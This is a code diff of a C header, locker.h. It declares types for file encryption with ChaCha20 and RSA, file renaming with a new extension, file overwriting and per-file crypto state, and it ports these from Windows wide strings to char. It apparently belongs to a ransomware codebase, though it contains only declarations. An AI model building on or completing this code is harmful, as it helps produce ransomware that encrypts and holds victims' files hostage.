@@ -1,10 +1,7 @@
 #ifndef _LOCKER_H_
 #define _LOCKER_H_
 
-#ifdef _WIN32
-#include <windows.h>
-#endif
-
+#include "api.h"
 #include "macro.h"
 #include "pathsystem.h"
 #include "chacha20/ecrypt-sync.h"
@@ -19,7 +16,6 @@
 #include <openssl/pem.h>
 #include <openssl/bio.h>
 #include <openssl/rand.h>
-
 
 #endif
 
@@ -36,9 +32,9 @@ typedef void (*EncryptMethodFunc)(void* FileInfo, void* ctx, int* padding, BYTE*
 typedef void (*EncryptGenKeyFunc)(void* ctx, BYTE* KEY, BYTE* IV);
 typedef BOOL (*EncryptAlgoMethod)(void* FileInfo);
 typedef BOOL (*OptionEncryptModeFunc)(void* FileInfo);
-typedef TCHAR* (*OptionNameFunc)(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath);
+typedef char* (*OptionNameFunc)(char* Path, char* Filename, char* exst, char* FPath);
 typedef bool (*OverWriteFunc)(void* CryptInfo, DESC desc_file, unsigned filesize);
-typedef bool (*HashSumFunc)(void* hash, DESC desc_file, TCHAR* Filename);
+typedef bool (*HashSumFunc)(void* hash, char* fullpath, char* Filename);
 
 
 namespace locker
@@ -55,7 +51,7 @@ namespace locker
 	struct descriptor
 	{
 		BYTE* key_data;
-		WCHAR* rsa_path;
+		char* rsa_path;
 		DWORD size;
 		BCRYPT_ALG_HANDLE crypto_provider;
 		BCRYPT_KEY_HANDLE handle_rsa_key;
@@ -102,14 +98,15 @@ namespace locker
 #ifdef _WIN32
 	typedef struct file_info
 	{
+		int dcrypt;
 		VOID* ctx;
 		PCRYPT_INFO CryptInfo;
-		WCHAR* Filename;
-		WCHAR* newFilename;
-		LPCWSTR FilePath;
+		char* Filename;
+		char* newFilename;
+		char* FilePath;
 		HANDLE FileHandle;
 		HANDLE newFileHandle;
-		LONGLONG Filesize;
+		size_t Filesize;
 		INT	padding;
 	}FILE_INFO, * PFILE_INFO;
 #else
@@ -123,7 +120,7 @@ namespace locker
 		char* FilePath;
 		int FileHandle;
 		int newFileHandle;
-		long long Filesize;
+		size_t Filesize;
 		int padding;
 	}FILE_INFO, * PFILE_INFO;
 #endif
